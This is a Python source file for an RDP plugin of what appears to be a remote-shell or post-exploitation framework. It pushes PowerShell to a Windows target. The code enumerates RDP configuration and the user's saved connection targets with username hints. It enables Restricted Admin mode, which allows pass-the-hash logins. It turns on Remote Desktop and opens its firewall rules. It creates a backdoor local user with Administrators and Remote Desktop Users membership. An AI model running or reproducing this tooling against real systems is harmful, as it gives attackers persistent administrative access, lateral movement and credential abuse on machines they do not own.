"""Windows Remote Desktop configuration and recent target enumeration."""

import json

from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ..api import plugin, SessionContext
from ..shared.common import format_generic_report
from ..shared.runner import parse_collector_json, run_collector_plugin


RDP_USAGE = """
RDP — Remote Desktop configuration and management.

Usage:
  run rdp                              Enumerate RDP configuration, status, and recent targets
  run rdp restricted-admin             Enable RDP Restricted Admin support
  run rdp start                        Enable Remote Desktop service and firewall rules
  run rdp adduser <user> <password>    Create a local user with admin and RDP access
  run rdp help

Examples:
  run rdp
  run rdp restricted-admin
  run rdp start
  run rdp adduser newuser StrongPasswordHere
""".strip()

PLUGIN_INFO = RDP_USAGE

def build_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
$rdp=@{{}}
$recent=@()
$settings=@{{}}
try{{
  $ts='HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'
  $rdp.Enabled=(Get-ItemProperty $ts -Name fDenyTSConnections -EA 0).fDenyTSConnections
  $rdp.Enabled=if($rdp.Enabled -eq 0){{'yes'}}else{{'no'}}
  $rdp.AllowRemoteRPC=(Get-ItemProperty $ts -Name AllowRemoteRPC -EA 0).AllowRemoteRPC
  $rdp.Port=(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name PortNumber -EA 0).PortNumber
  $rdp.NLA=(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name UserAuthentication -EA 0).UserAuthentication
  $rdp.SecurityLayer=(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name SecurityLayer -EA 0).SecurityLayer
}}catch{{}}
try{{
  $servers='HKCU:\Software\Microsoft\Terminal Server Client\Servers'
  if(Test-Path $servers){{
    Get-ChildItem $servers -EA 0|ForEach-Object{{
      $props=Get-ItemProperty $_.PSPath -EA 0
      $recent+=@{{host=$_.PSChildName;username=$props.UsernameHint;last_connected=$props}}
    }}
  }}
}}catch{{}}
try{{
  $def='HKCU:\Software\Microsoft\Terminal Server Client\Default'
  if(Test-Path $def){{
    $settings.MRU0=(Get-ItemProperty $def -Name MRU0 -EA 0).MRU0
    $settings.Addins=(Get-ItemProperty $def -EA 0|Get-Member -MemberType NoteProperty|Where-Object Name -notmatch '^PS'|Select-Object -ExpandProperty Name)
  }}
}}catch{{}}
try{{
  $fw=Get-NetFirewallRule -DisplayGroup 'Remote Desktop' -EA 0|Select-Object DisplayName,Enabled,Direction,Action
  $settings.FirewallRules=@($fw|ForEach-Object{{ @{{name=$_.DisplayName;enabled=$_.Enabled;action=$_.Action}} }})
}}catch{{}}
try{{
  $sessions=quser 2>$null
  if($sessions){{ $settings.ActiveSessions=($sessions -split "`n").Count - 1 }}
}}catch{{}}
$result=[ordered]@{{
  summary=@{{RDP_Enabled=$rdp.Enabled;Port=$rdp.Port;Recent_Targets=$recent.Count;NLA=$rdp.NLA}}
  rdp_configuration=$rdp
  recent_targets=$recent
  client_settings=$settings
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 5 -Compress)+$end)
"""


def _build_restricted_admin_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
$result=[ordered]@{{action='restricted-admin';ok=$false;output='';message=''}}
try{{
  $out=reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f 2>&1|Out-String
  $result.output=($out -replace '\s+',' ').Trim()
  if($LASTEXITCODE -eq 0){{
    $result.ok=$true
    $result.message='RDP Restricted Admin support enabled (DisableRestrictedAdmin=0)'
  }}else{{
    $result.error="reg add failed with exit code $LASTEXITCODE"
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 5 -Compress)+$end)
"""


def _build_start_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
$result=[ordered]@{{action='start';ok=$false;steps=@();message=''}}
try{{
  Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
    -Name 'fDenyTSConnections' -Value 0 -EA Stop
  $result.steps+=@{{step='registry';ok=$true;detail='fDenyTSConnections=0'}}

  Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' -EA Stop|Out-Null
  $result.steps+=@{{step='firewall';ok=$true;detail='Remote Desktop firewall rules enabled'}}

  Set-Service -Name TermService -StartupType Automatic -EA Stop
  Start-Service -Name TermService -EA Stop
  $svc=Get-Service TermService -EA 0
  $result.steps+=@{{step='service';ok=($svc.Status -eq 'Running');detail="TermService status=$($svc.Status)"}}

  $result.ok=($result.steps|Where-Object{{-not $_.ok}}).Count -eq 0
  if($result.ok){{
    $result.message='Remote Desktop enabled (registry, firewall, and TermService)'
  }}else{{
    $result.error='One or more RDP start steps failed'
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 5 -Compress)+$end)
"""


def _build_adduser_command(username: str, password: str):
    user_json, pass_json = json.dumps(username), json.dumps(password)

    return rf"""
$ErrorActionPreference='Stop'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$user={user_json};$pass={pass_json}
$result=[ordered]@{{action='adduser';ok=$false;user=$user;steps=@()}}

function NetStep($name,[string[]]$a){{
  try{{
    $o=& "$env:SystemRoot\System32\net.exe" @a 2>&1|Out-String
    $c=$LASTEXITCODE
    [ordered]@{{step=$name;ok=($c-eq 0);exit_code=$c;detail=(($o-replace'\s+',' ').Trim())}}
  }}catch{{
    [ordered]@{{step=$name;ok=$false;exit_code=-1;detail=$_.Exception.Message}}
  }}
}}

try{{
  $result.steps+=NetStep 'create_user' @('user',$user,$pass,'/add')
  $result.steps+=NetStep 'administrators' @('localgroup','Administrators',$user,'/add')
  $result.steps+=NetStep 'rdp_users' @('localgroup','Remote Desktop Users',$user,'/add')

  $failed=@($result.steps|?{{-not $_.ok}})
  $result.ok=$failed.Count-eq 0
  if($result.ok){{
    $result.message="User '$user' created with Administrators and Remote Desktop Users membership"
  }}else{{
    $result.error="Failed step(s): $(($failed|% step)-join ', ')"
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}

Write-Output ($start+(ConvertTo-Json $result -Depth 5 -Compress)+$end)
"""



def _format_action_report(data: dict) -> str:
    action = data.get('action', 'rdp')
    lines = []
    if data.get('ok'):
        lines.append(f"RDP {action}: success")
    else:
        lines.append(f"RDP {action}: failed")
    if data.get('message'):
        lines.append(str(data['message']))
    if data.get('error'):
        lines.append(f"Error: {data['error']}")
    if data.get('output'):
        lines.append(str(data['output']).strip())
    for step in data.get('steps') or []:
        status = 'ok' if step.get('ok') else 'failed'
        detail = step.get('detail') or step.get('step') or ''
        label = step.get('step') or 'step'
        lines.append(f"  [{status}] {label}: {detail}".rstrip(': '))
    return '\n'.join(lines)


def _run_rdp_action(session: SessionContext, plugin_name: str, win_ps: str, timeout: float = 45.0) -> int:
    session.log_event(f'Plugin {plugin_name}: action started')
    session._handler._flush_shell(session._client_sock, timeout=1.0)

    raw = session.run_marked(
        'true',
        win_ps,
        timeout=timeout,
        start_mark=PLUGIN_MARK_START,
        end_mark=PLUGIN_MARK_END,
        strip_ws=False,
    )

    if raw is None:
        session.print(f"Plugin '{plugin_name}' failed — no response from target.", 'red')
        session.log_plugin_result(plugin_name, '', 'no response (timeout or missing markers)')
        return 1

    data = parse_collector_json(raw)
    if not data:
        session.print(f"Plugin '{plugin_name}' failed — could not parse results.", 'red')
        session.log_plugin_result(plugin_name, raw[:4000], 'parse error')
        return 1

    if data.get('error') and not data.get('ok'):
        report = _format_action_report(data)
        session.print(report, 'red')
        session.log_plugin_result(plugin_name, report, json.dumps(data, indent=2))
        return 1

    report = _format_action_report(data)
    session.print(report, 'green' if data.get('ok') else 'red')
    session.log_plugin_result(plugin_name, report, json.dumps(data, indent=2))
    session.log_command(f'run {plugin_name}', report)
    return 0 if data.get('ok') else 1


def _run_collect(session: SessionContext) -> int:
    return run_collector_plugin(
        session,
        'rdp',
        None,
        build_command,
        format_generic_report,
        timeout=35.0,
    )


@plugin.command(
    name='rdp',
    platforms=['windows'],
    description='Remote Desktop configuration, enumeration, and management (restricted-admin, start, adduser)',
)
def run(session: SessionContext, args):
    if args and args[0].strip().lower() in ('-h', '--help', 'help', '?'):
        session.print(RDP_USAGE, 'yellow')
        return 0

    if not args:
        return _run_collect(session)

    action = args[0].strip().lower()
    if action == 'restricted-admin':
        return _run_rdp_action(session, 'rdp restricted-admin', _build_restricted_admin_command())
    if action == 'start':
        return _run_rdp_action(session, 'rdp start', _build_start_command())
    if action == 'adduser':
        if len(args) < 3:
            session.print(RDP_USAGE, 'yellow')
            session.print("Error: rdp adduser requires a username and password.", 'red')
            return 1
        username = args[1].strip()
        password = args[2]
        if not username or not password:
            session.print(RDP_USAGE, 'yellow')
            session.print("Error: rdp adduser requires a non-empty username and password.", 'red')
            return 1
        return _run_rdp_action(
            session,
            'rdp adduser',
            _build_adduser_command(username, password),
        )

    session.print(f"Unknown rdp subcommand: {args[0]}", 'red')
    session.print(RDP_USAGE, 'yellow')
    return 1
